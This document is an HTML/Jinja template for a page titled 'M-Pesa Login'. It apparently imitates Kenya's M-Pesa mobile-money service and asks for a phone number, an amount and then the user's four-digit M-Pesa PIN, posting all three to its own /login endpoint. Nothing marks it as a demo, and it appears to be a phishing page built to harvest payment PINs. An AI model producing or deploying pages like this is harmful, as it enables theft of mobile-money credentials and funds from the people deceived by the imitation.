<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>M-Pesa Login</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #f6faf7, #dfeee4);
      color: #1a1a1a;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 14px 30px rgba(0,0,0,0.08);
      padding: 28px 22px;
    }

    h2 {
      margin: 0 0 10px;
      text-align: center;
      color: #0d7a3d;
    }

    .subtitle {
      margin: 0 0 22px;
      text-align: center;
      color: #4b4b4b;
      font-size: 14px;
    }

    .field {
      margin-bottom: 16px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #d1d9d3;
      border-radius: 10px;
      font-size: 15px;
      outline: none;
    }

    input:focus {
      border-color: #0d7a3d;
      box-shadow: 0 0 0 3px rgba(13, 122, 61, 0.13);
    }

    .pin-section {
      display: none;
      margin-top: 10px;
    }

    .pin-section.visible {
      display: block;
    }

    .actions {
      margin-top: 8px;
    }

    button {
      width: 100%;
      border: none;
      border-radius: 10px;
      background: #0d7a3d;
      color: white;
      font-size: 16px;
      font-weight: 700;
      padding: 13px 16px;
      cursor: pointer;
      transition: 0.2s ease;
    }

    button:hover {
      background: #0a652f;
    }

    .message {
      min-height: 22px;
      margin-top: 12px;
      text-align: center;
      font-size: 14px;
    }

    .error {
      color: #b42318;
    }

    .success {
      color: #0b7a3d;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>M-Pesa Payment</h2>
    <p class="subtitle">Enter your phone number and amount, then your M-Pesa PIN.</p>

    <form method="POST" action="/login" novalidate>
      <div class="field">
        <label for="phone">Phone Number</label>
        <input id="phone" name="phone" type="tel" value="{{ phone or '' }}" placeholder="254712345678" required />
      </div>

      <div class="field">
        <label for="amount">Amount</label>
        <input id="amount" name="amount" type="number" min="1" step="0.01" value="{{ amount or '' }}" placeholder="500" required />
      </div>

      <div id="pinSection" class="pin-section {{ 'visible' if show_pin else '' }}">
        <div class="field">
          <label for="pin">M-Pesa PIN</label>
          <input id="pin" name="pin" type="password" value="{{ pin or '' }}" placeholder="Enter M-Pesa PIN" maxlength="4" inputmode="numeric" />
        </div>
      </div>

      <div class="actions">
        <button id="submitBtn" type="submit">{{ 'Confirm PIN' if show_pin else 'Continue' }}</button>
      </div>

      {% if error %}
        <p class="message error">{{ error }}</p>
      {% elif success %}
        <p class="message success">{{ success }}</p>
      {% endif %}
    </form>
  </div>

  <script>
    const phoneInput = document.getElementById('phone');
    const amountInput = document.getElementById('amount');
    const pinSection = document.getElementById('pinSection');
    const submitBtn = document.getElementById('submitBtn');

    function updatePinVisibility() {
      const hasPhone = phoneInput.value.trim() !== '';
      const hasAmount = amountInput.value.trim() !== '';

      if (hasPhone && hasAmount) {
        pinSection.classList.add('visible');
        submitBtn.textContent = 'Confirm PIN';
      } else {
        pinSection.classList.remove('visible');
        submitBtn.textContent = 'Continue';
      }
    }

    phoneInput.addEventListener('input', updatePinVisibility);
    amountInput.addEventListener('input', updatePinVisibility);

    const initialShowPin = {{ 'true' if show_pin else 'false' }};
    if (initialShowPin) {
      pinSection.classList.add('visible');
      submitBtn.textContent = 'Confirm PIN';
    }
  </script>
</body>
</html>
